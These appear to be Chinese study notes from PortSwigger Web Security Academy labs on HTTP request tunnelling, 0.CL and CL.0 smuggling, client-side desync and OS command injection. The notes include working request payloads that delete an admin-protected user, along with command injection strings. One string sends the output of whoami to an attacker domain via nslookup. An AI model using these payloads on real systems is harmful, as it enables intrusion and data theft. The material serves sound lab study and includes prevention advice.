![image-20261103120111582](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103120111582.png)

这种技术可以绕过前端的安全措施，以这种方式将请求隧道到后端，这是一种有限的请求走私形式，但仍然存在高度的可利用性。  



#### HTTP/2 请求隧道

请求隧道在 HTTP/1、HTTP/2 中都存在，但在 HTTP/1 的环境检测难度较高。由于 HTTP/1 中的 keep-alive 连接的工作方式，即使收到两个响应，也不能确认请求被成功走私。  

在 HTTP/2 中，每个“流”都应该只包含一个请求和响应，如果收到一个 HTTP/2 响应，其中响应体看起来包含一个 HTTP/1 响应，就可以确认已经成功隧道到第二个请求。  





#### 请求隧道泄露内部 header

当仅能使用请求隧道时，无法使用前面的技术泄露内部头，但通过 HTTP/2 降级出现一种方案。  

需要诱骗前端服务器将内部头追加到发往后端的请求体中，例如我们发送一个如下请求：

```http
:method	POST
:path	/comment
:authority	vulnerable-website.com
content-type	application/x-www-form-urlencoded
foo	
bar\r\n
Content-Length: 200\r\n
\r\n
comment=

x=1
```

此请求中前后端都认为只有一个请求，但可以使他们在头部结束的位置产生分歧。  

前端将注入的请求视作是头部的一部分，因此在尾随的 `comment=` 字符串之后添加任何新的头部。而后端看到 `\r\n\r\n` 序列，认为是头部结束标志， `comment=` 字符串连同内部头都被认为是请求体的一部分。结果就是一个 `comment` 参数，值是内部请求头的内容。  

```http
POST /comment HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

comment=X-Internal-Header: secretContent-Length: 3
x=1
```



#### 盲请求隧道

一些前端服务器会读取从后端收到的所有数据，这样如果成功隧道到一个请求，可能会将两个响应都转发到客户端，隧道请求的响应被嵌入到主响应的 body 中。  

其它服务器只读取响应 `Content-Length` 头中指定的字节数，因此只有第一个被转发给客户端。这样由于无法看到隧道请求的响应，就属于盲请求隧道漏洞。  



#### 使用 HEAD 的非盲请求隧道

盲请求隧道难以利用，但偶尔可以通过 HEAD 请求走私将这些漏洞变为非盲。  

对于 HEAD 请求的响应通常包含 `Content-Length` 头，即使没有请求体。这个长度通常指的是对同一端点进行 GET 请求将返回的资源长度。一些前端服务器会尝试读取 header 中指定的字节数，这种操作可能导致过度读取后端的响应，这样就会收到隧道请求响应开头的字节。  

请求：

```http
:method	HEAD
:path	/example
:authority	vulnerable-website.com
foo	
bar\r\n
\r\n
GET /tunnelled HTTP/1.1\r\n
Host: vulnerable-website.com\r\n
X: x
```

响应：

```http
:status	200
content-type	text/html
content-length	131
HTTP/1.1 200 OK
Content-Type: text/html
Content-Length: 4286

<!DOCTYPE html>
<h1>Tunnelled</h1>
<p>This is a tunnelled respo
```

这样属于将一个响应的 `Content-Length` 头和另一个响应的 body 混合在一起，因此需要一些平衡技巧。      

如果 HEAD 请求的端点返回的资源比你要读取的隧道响应短，可能会在看到所需数据之前被截断。而如果返回的 `Content-Length` 比隧道请求的响应长，前端等待后续字节，可能会超时。  

通过一些试错可以尝试下列解决方案克服问题：

* 将 HEAD 请求指向一个根据需要返回更长或更短资源的不同端点
* 如果资源太短，在主 HEAD 请求中使用反射输入来注入任意的填充字符。即使实际上看不到你的输入被反射，返回的 `Content-Length` 仍然会相应的增加。
* 如果资源太长，在隧道请求中使用反射输入来注入任意字符，使隧道响应的长度匹配或超过预期内容的长度。





#### HTTP/2 请求隧道实验

* 在 blog 中找一篇提交一份评论，然后在 BurpSuite 中将刚才的请求发送到 Repeater 中，进行修改，大致如下：

  ```http
  POST /post/comment HTTP/2
  Host: 0af70038044fb30280753583001100e7.web-security-academy.net
  Cookie: session=b2VlYuhxeTGVrHaqASskDsY0xBr4nTPr
  
  csrf=I102H44V2OiBRShm8aYJB6GQiyBn3m6x&postId=4&name=attacker&email=b@ad.man&website=http://malicio.us&comment=xxx
  ```

* 正常会收到 302 跳转说明请求正常

  ```http
  HTTP/2 302 Found
  Location: /post/comment/confirmation?postId=4
  X-Frame-Options: SAMEORIGIN
  Content-Length: 0
  
  ```

* 在文章评论能看到刚提交的内容

  <img src="../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103173517016.png" alt="image-20261103173517016" style="zoom:150%;" />

* 修改请求，在右侧 Inspector 中的 Request Header 添加一个请求头以通过走私隧道获取前端添加的内部 header，请求内容大致如下：

  ```http
  POST /post/comment HTTP/2
  Host: 0af70038044fb30280753583001100e7.web-security-academy.net
  Content-Type: application/x-www-form-urlencoded
  Foo: bar
  Cookie: session=b2VlYuhxeTGVrHaqASskDsY0xBr4nTPr
  Content-Length: 210
  
  csrf=I102H44V2OiBRShm8aYJB6GQiyBn3m6x&postId=4&name=attacker&email=b@ad.man&website=http://malicio.us&comment=
  
  
  ```

  ![image-20261103183112628](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103183112628.png)

* response 以 302 跳转返回，刷新该文章评论中会插入内部 header：

  ```
  : Content-Length: 3 X-SSL-VERIFIED: 0 X-SSL-CLIENT-CN: null X-FRONTEND-KEY: 807187393228828
  ```

* 添加一个 HEAD 方法请求 / 路径到 repeater 中，修改添加 header 如下：

  ```http
  foo: bar
  
  GET /admin HTTP/1.1
  X-SSL-VERIFIED: 1
  X-SSL-CLIENT-CN: administrator
  X-FRONTEND-KEY: 807187393228828
  
  
  ```

* ```http
  HTTP/2 500 Internal Server Error
  Content-Type: text/html; charset=utf-8
  Content-Length: 151
  
  <html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Received only 3180 of expected 8915 bytes of data</h1></body></html>
  ```

* 上面错误表示 HEAD 请求的 / 返回字节 8915 大于内部请求 /admin 返回的页面数据 3180，需要找一个适当的资源重试，这里找到一个`/resources/labheader/images/ps-lab-notsolved.svg` 约 800 左右，修改后请求：

* ![image-20261103184549063](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103184549063.png)

* 走私的请求返回 401 未授权，经过排查是 comment 中获取的字节少了一位，应该是 `X-FRONTEND-KEY: 8071873932288288`，修改后再次重试：

* ![image-20261103185302523](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103185302523.png)

* 返回 200，再次将 URL 修改为删除 carlos，如下：

* ```http
  foo: bar
  
  GET /admin/delete?username=carlos HTTP/1.1
  X-SSL-VERIFIED: 1
  X-SSL-CLIENT-CN: administrator
  X-FRONTEND-KEY: 8071873932288288
  
  
  ```

* 请求结果：

* ```http
  HTTP/2 500 Internal Server Error
  Content-Type: text/html; charset=utf-8
  Content-Length: 149
  
  <html><head><title>Server Error: Proxy error</title></head><body><h1>Server Error: Received only 372 of expected 809 bytes of data</h1></body></html>
  ```

* 虽然提示返回的字节超过期待数量，但是已经成功触发删除 URL，刷新页面即可看到 solved。

* ![image-20261103185606397](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261103185606397.png)

  





#### 经过 HTTP/2 请求隧道缓存投毒

请求隧道比经典的走私场景更受限，但仍然可以构造高严重性的攻击。例如 web 缓存投毒。  

通过非盲请求隧道，可以将一个 response 的 header 和另一个 response 的 body 混合搭配。如果 body 中反射了未编码的用户输入，就可以利用，在浏览器中不会执行代码的上下文中实现反射型 XSS。  

示例，未编码的、攻击者可控的输入：

```http
HTTP/1.1 200 OK
Content-Type: application/json

{ "name" : "test<script>alert(1)</script>" }
[etc.]
```

本身这个 response 为 application/json 类型，不会造成危险。但结合请求隧道到后端，这个 response 出现在另一个 response 的 body 中，并且继承第二个 response 的 `content-type` ：

```http

:status	200
content-type	text/html
content-length	174
HTTP/1.1 200 OK
Content-Type: application/json

{ "name" : "test<script>alert(1)</script>" }
[etc.]
```

由于缓存在前端，这些混合的响应内容就可能会被返回给其他用户。  







### 0.CL 请求走私

0.CL 脱同步攻击的前提是前后端存在 **H-V（Hidden-Visible）** 差异 ，是发送在前端忽略 `Content-Length` 头，认为请求不存在 body，后端服务器处理 `Content-Length` 的情况下持续等待 body 到达。这种场景长期被认为存在死锁不可利用。  



示例，前端忽略 CL 头 ，会将下面请求视为2个发送到后端：

```http
GET /Logon HTTP/1.1
Host: <redacted>
Content-Length:
 7

GET /404 HTTP/1.1
X: Y
```

后端服务器处理 CL 头，收到第一个请求会一直等待后续 body 数据直到超时。  



**early-response gadget**  

但通过将 0.CL 与一个提前响应组件(early-response gadget)结合（这是一种使后端收到完整请求体之前就做出响应的技术），攻击者就可以打破死锁，然后使用双脱同步（double desync）来构建完整的利用。  



一些 **early-response gadget** ：

* IIS：`GET /con` ，CON 等一些关键字在 Windows 中属于保留名称
* Nginx：静态文件，响应静态文件时不等待 request body
* 通用的：服务器级别的重定向，因为重定向不需要 request body
* Apache：暂未发现，出错会立即关闭连接



示例，访问 IIS 的请求，如果命中  /con 这种保留名称 URL，IIS 不会等待 body 到达就做出响应，并且保持连接开放：

```http
GET /con HTTP/1.1
Host: <redacted>
Content-Length:
 7

GET / HTTP/1.1
Host: <redacted>
```

用户视角：![image-20261105113007930](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261105113007930.png)

后端服务器视角：

![image-20261105113050143](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261105113050143.png)







**双脱同步**  

核心思路是将 0.CL 转换为 CL.0，分 3 个阶段，关键技巧是利用大多数服务器在头部块末尾插入额外头部，如果走私从头部快前方开始，追加的头部落在走私请求之后，不影响 CL 的计算，攻击就能够相对可靠的起效：

```
阶段 1：0.CL 毒化
  POST /nul HTTP/1.1
  Content-length:
   163

  POST / HTTP/1.1
  Content-Length: 111
  ...
  ↓
  前端看不到 CL，缓冲 POST / 请求
  后端看到 CL=163，等待请求体
  但 /nul 是提前响应 gadget，后端立即返回响应
  连接保持开放，POST / 请求留在后端缓冲区

阶段 2：CL.0 武器化
  后端缓冲区中的 POST / 请求被处理
  它的 CL=111 让后端继续读取请求体
  但实际数据是 GET / HTTP/1.1...（来自下一个请求）
  → 形成 CL.0 脱同步，恶意前缀被注入

阶段 3：毒化受害者
  恶意前缀 + 受害者请求 → 有害响应
```



**Expect头**  

核心是发现 `Expect: 100-continue` 会破坏前端对请求体的处理逻辑，该请求头是早期的优化头。  

除了原始的头，还存在混淆头：`Expect: y 100-continue` ，即在原始头中混杂一些内容，让前端忽略该头，后端处理，产生 0.CL。  

T-Mobile 示例：

```http
GET /logout HTTP/1.1
Host: <redacted>.t-mobile.com
Expect: 100-continue
Content-Length: 291

HTTP/1.1 404 Not Found          ← 后端返回 404，不是 100
GET /logout HTTP/1.1
Host: <redacted>.t-mobile.com
Content-Length: 100

GET / HTTP/1.1
Host: <redacted>.t-mobile.com

GET https://psres.net/assets HTTP/1.1
X: y
HTTP/1.1 200 OK
GET / HTTP/1.1
Host: <redacted>.t-mobile.com

HTTP/1.1 301 Moved Permanently
Location: https://psres.net/…   ← 成功重定向到攻击者域名
```









0.CL 脱同步漏洞是一个较新发现的请求走私形式。  

参考：https://portswigger.net/research/http1-must-die  

作者列出的一些时间线：

- 2004: [HTTP Request Smuggling](https://www.cgisecurity.com/lib/HTTP-Request-Smuggling.pdf) – (largely forgotten)
- 2016: [Hiding wookies in HTTP](https://media.defcon.org/DEF CON 24/DEF CON 24 presentations/DEF CON 24 - Regilero-Hiding-Wookiees-In-Http.pdf) (largely ignored at the time)
- 2019: [Exploit header parser discrepancies](https://portswigger.net/research/http-desync-attacks-request-smuggling-reborn) (CL.TE, TE.CL)
- 2021: [Exploit HTTP/2 downgrading](https://portswigger.net/research/http2) (H2.CL, H2.TE)
- 2022: [Exploit endpoints that ignore CL](https://portswigger.net/research/browser-powered-desync-attacks) (CL.0, H2.0, CSD)
- 2024: [Exploit dechunking](https://www.bugcrowd.com/blog/unveiling-te-0-http-request-smuggling-discovering-a-critical-vulnerability-in-thousands-of-google-cloud-websites/) (TE.0)
- 2025: [Exploit chunk extensions (TE.TE)](https://w4ke.info/2025/06/18/funky-chunks.html)
- Just now: 0.CL desync attacks



## 基于浏览器的请求走私



### CL.0 请求走私

有时一些后端服务器可以被忽悠忽略 CL 头，这意味着它们会忽略请求的 body，等同于 ` Content-Length: 0` ，因此称为 CL.0 漏洞。这开启了一条不需要 TE 或者 H2 的 HTTP 请求走私方法。



#### 探测

探测 CL.0 漏洞，首先发送一个在其请求体中包含另一个部分请求的请求，然后发送一个正常的后续请求。然后检查后续请求的响应中是否收到了走私前缀的影响。  

示例请求：

```http
POST /vulnerable-endpoint HTTP/1.1
Host: vulnerable-website.com
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

GET /hopefully404 HTTP/1.1
Foo: xGET / HTTP/1.1
Host: vulnerable-website.com
```

两条请求的响应：

```http
HTTP/1.1 200 OK



HTTP/1.1 404 Not Found
```

这里没有篡改任何请求头。  

可以在 BurpSuite 中按照如下操作：

* 创建一个包含设置请求的 tab，和另一个包含任意请求的 tab
* 将两个 tab 添加到一个组中
* 使用发送按钮旁边的按顺序发送组
* `Connection` 头改为 `keep-alive`
* 发送序列然后检查 response



在实际环境中，主要重点应放在服务器级别的重定向、静态资源上，而其它不接收 POST 请求的 endpoint 上大多数隐式的认为没有 body，因此不会观察到。  





#### 诱导 CL.0

如果找不到容易攻击的 endpoint，可以尝试触发服务器错误来诱导该行为。一些服务器会发出错误 response，然后不从套接字上读取剩余 body 数据，如果此时它们不关闭连接，就可以成为 CL.0 脱同步漏洞的一环。  

也可以尝试类似 TE.TE 中的头部混淆技术，想办法对前端展示 CL 头但对后端隐藏。  



#### 利用 lab 实验

前端阻塞了访问 /admin 这个 URL 的请求，需要通过走私请求删除账户。  
请求1：

```http
GET /resources/images/avatarDefault.svg HTTP/1.1
Host: 0aae0016036482cc807b9e8b0000000b.web-security-academy.net
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

GET /admin/delete?username=carlos HTTP/1.1
Foo: x
```

请求2：

```http
GET / HTTP/1.1
Host: 0aae0016036482cc807b9e8b0000000b.web-security-academy.net
Connection: keep-alive

```

上面两个请求添加到同一个组中，按顺序发送，响应1：

```http
HTTP/1.1 200 OK
Content-Type: image/svg+xml
Cache-Control: public, max-age=3600
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=10
Content-Length: 9881

<?xml version="1.0" encoding="utf-8"?>
<!-- Generator: Adobe Illustrator 22.1.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
<svg version="1.1" xmlns="http://www.w3.org/2000/svg"  x="0px" y="0px"
     viewBox="0 0 50 50" style="enable-background:new 0 0 50 50;" xml:space="preserve">
<style type="text/css">
	.st0{fill:#BCD4E8;}
	.st1{fill:#EDF5F9;}
	....... omit .......
```

响应2：

```http
HTTP/1.1 302 Found
Location: /admin
Set-Cookie: session=QduwPcgc1617wZo23WFhZE86vHzeIasl; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Keep-Alive: timeout=10
Content-Length: 0

```







### 客户端脱同步攻击

https://portswigger.net/web-security/request-smuggling/browser/client-side-desync

请求走私传统上是服务器端要考虑的，因为利用这些漏洞需要 BurpSuite 之类的工具，标准的浏览器不会发送这种类型的请求去触发脱同步。但从上面 CL.0 实验可以看出，有时候可以使用完全兼容浏览器 HTTP/1 的请求来制造脱同步。  

![image-20261106161143607](../upload/2026-07-06-PortSwigger_BurpSuite/image-20261106161143607.png)

CSD(Client-Side Desync)是使得受害者 web 浏览器和网站连接之间脱同步的攻击。  

有时有些 web 服务器在不读取 body 的情况下响应 POST 请求，如果后续允许浏览器复用同一连接，就会导致客户端脱同步。  

主要涉及下面几个阶段：

1. 受害者访问的任意域名上包含恶意 JS 脚本
2. 这个 JS 脚本导致受害者浏览器请求目标网站，这个请求的 body 中包含了攻击者控制的请求前缀，就像普通请求走私一样
3. 服务器响应受害者请求后，body 中的恶意前缀保留在服务器 TCP/TLS 套接字上，这就使得与浏览器连接脱同步
4. 然后 JS 脚本继续使用被毒化的连接发送下一个请求，此请求被追加到恶意前缀上，从而引出服务器的 response

重要的是目标服务器必须不支持 HTTP/2 ，客户端脱同步依赖于 HTTP/1.1 连接复用，如果服务器支持客户端将优先使用 HTTP/2。







### 基于暂停的脱同步攻击

有些网站隐含的脱同步漏洞，只有在请求中途暂停时才会展现出来。通过发送 header，声明一个 body，然后等待。有时就能发现脱同步漏洞。





## 预防

* 尽可能使用 HTTP/2 端到端并且关闭 HTTP 降级。
* 规范前端服务中带歧义的请求，让后端服务器拒绝带有歧义的请求，关闭对应 TCP 连接。
* 从不假设请求没有 body 的请求，这是 CL.0 和 客户端非同步漏洞的根本原因。
* 默认丢弃导致服务端处理抛出异常的请求。
* 如果流量经过转发，尽量在上游开启 HTTP/2。





# SSTI(Server-side Template Injection) 服务端模板注入







# CORS





# Clickjacking（UI redressing）





# OS command injection



## 命令注入示例

假设一个购物网站使用如下URL查询库存：

```http
https://insecure-website.com/stockStatus?productID=381&storeID=29
```

由于历史原因，系统中需要转换参数给如下程序来获取库存：

```sh
stockreport.pl 381 29
```

上面程序输出库存状态和商品说明返回给用户。由于没有防御命令注入，就可以使用如下方式注入命令：

```bash
& echo aiwefwlguh &
```

echo 命令会输出一些字符串，`&` 字符会分割命令，命令结果和错误消息随着程序一起返回：

```bash
Error - productID was not provided
aiwefwlguh
29: command not found
```

要注入的命令后面也添加 `&` 符号可以避免后续参数干扰命令注入。  



示例 lab：

```http
POST /product/stock HTTP/2
Host: 0a1c000104f5317a82527e02002700c8.web-security-academy.net
... omit ...
Content-Type: application/x-www-form-urlencoded
Content-Length: 39

productId=%26%20whoami%20%26&storeId=2
```





## 获取信息命令

当确认存在命令注入漏洞后，就可以尝试获取一些环境相关信息：

| Purpose of command    | Linux         | Windows         |
| --------------------- | ------------- | --------------- |
| Name of current user  | `whoami`      | `whoami`        |
| Operating system      | `uname -a`    | `ver`           |
| Network configuration | `ifconfig`    | `ipconfig /all` |
| Network connections   | `netstat -an` | `netstat -an`   |
| Running processes     | `ps -ef`      | `tasklist`      |



## 盲注

很多应用程序存在命令盲注漏洞，不会返回输出到 HTTP 的 response 中。但结合不同的技术仍然可以加以利用。  

假设一个网站程序允许用户提交 feedback 消息，服务端程序生成一封邮件到网站管理员对应邮箱账户，内容通过 `mail` 程序发送：

```
mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com
```

执行结果不会通过 response 返回。  



### 延迟探测

可以通过一些触发延迟的命令探测盲注，例如 ping ：

```bash
& ping -c 10 127.0.0.1 &
```

上面命令执行产生大约 10s 左右延迟。  

示例 lab，通过提交脚注注入命令：

```http
POST /feedback/submit HTTP/2
Host: 0a5b0032035a47fd8002d503005a002c.web-security-academy.net
Cookie: session=WYRa56PEP9MHOjHfuokFUlcVVxO22u5s
Content-Length: 114
Content-Type: application/x-www-form-urlencoded

csrf=zXQPniKmbALnpFIbM3IlZRhlRG6eE3Ln&name=abc&email=a@b.c%26%20ping -c 10 127.0.0.1%20%26&subject=hhh&message=aaa
```





### 重定向输出探测

如果能够重定向输出到 web 网站目录下的文件，并且该文件可以通过 URL 访问到，就可以通过这种方式来探测。  

假设用户静态资源存放在 `/var/www/static`，可以尝试如下注入：

```bash
& whoami > /var/www/static/whoami.txt &
```

然后尝试访问 `https://vulnerable-website.com/whoami.txt` 读取结果。  

示例lab，网站将产品相关图片存放在`/var/www/images/` ，可以向该路径中重定向输出，然后检测：

```http
POST /feedback/submit HTTP/2
Host: 0a4d0066047606e68038531600460025.web-security-academy.net
Cookie: session=JW9IphfJTJtmdfzfUYTFKnYcqe9LJ4Dn

csrf=TD9edv5uLA2wijjBXmpdXHsYRnNWqldZ&name=aa&email=att%40ack.er%26%20whoami > /var/www/images/whoami.jpg%20%26&subject=def&message=hahahah
```

请求对应资源：

```http
GET /image?filename=whoami.jpg HTTP/2
Host: 0a4d0066047606e68038531600460025.web-security-academy.net


```

response:

```http
HTTP/2 200 OK
Content-Type: image/jpeg
Set-Cookie: session=qhYgnRGnnPKZ1VLarQewCDanSuMs0wfY; Secure; HttpOnly; SameSite=None
X-Frame-Options: SAMEORIGIN
Content-Length: 13

peter-nojGLI

```



### OAST 带外管理

如果能够注入命令通过触发带外网络与你掌握的主机系统交互，可以尝试类似命令：

```bash
& nslookup kgji2ohoyw.web-attacker.com &
```

攻击者可以通过监控对应特定域名的 nslookup 的查询记录探测命令是否成功注入。  

还有一种可以通过带外管理携带信息的 nslookup 方式：

```bash
& nslookup `whoami`.kgji2ohoyw.web-attacker.com &
```

如果成功通过带外管理触发 nslookup，这会导致 DNS 产生类似如下记录：

```bash
wwwuser.kgji2ohoyw.web-attacker.com
```

示例lab，提示需要 collaborator，但尝试往xxx.burpcollaborator.net地址发送 nslookup 就能够触发解决lab（另一个携带whoami 信息的lab无法通过此方法解决） ：

```http
POST /feedback/submit HTTP/2
Host: 0a6b00fc0419b9d680d02652008c006b.web-security-academy.net
Cookie: session=LjvS1cga0eZ5osm2lNbFLWxwMCdDofu3

csrf=Df1HHp9vnB7L4QSbJa8CnImlOdhcJ1wx&name=attacker&email=b%40ad.man%26%20nslookup skjdlsjdlsjdlsjld.burpcollaborator.net%20%26&subject=ping&message=ssssssss
```





## 注入命令的方式

可以使用很多 shell 元字符进行命令注入攻击，这些命令在 Windows、UNIX 中都可以使用，以链式命令的方式注入：

```bash
&
&&
|
||
```

UNIX 中可以使用的：

- `;`

- Newline (`0x0a` or `\n`)

- ```
  ` injected command `
  $(injected command)
  ```

不同的元字符行为有差异，可能在不同场景下影响效果。  

有时注入命令是在原始命令的引号中，此时需要在合适的 shell 元字符注入之前使用 `"` 、`'` 之类的终止引用的上下文。  



## 预防命令注入

最有效的是永远不在应用层代码中调用 OS 命令，使用更安全的平台 API 来实现相关功能。  

如果必须使用用户的输入来调用 OS 命令，必须进行强输入验证，一些场景中的示例：

* 针对白名单做输入验证
* 验证输入是一个数字
* 验证输入只包含字母数字字符，不允许空格或其它语法

不要尝试转义 shell 元字符净化输入，在实践中很容易出错且容易被绕开。  





# API Testing





# OAuth



# JWT





# NoSQL injection



























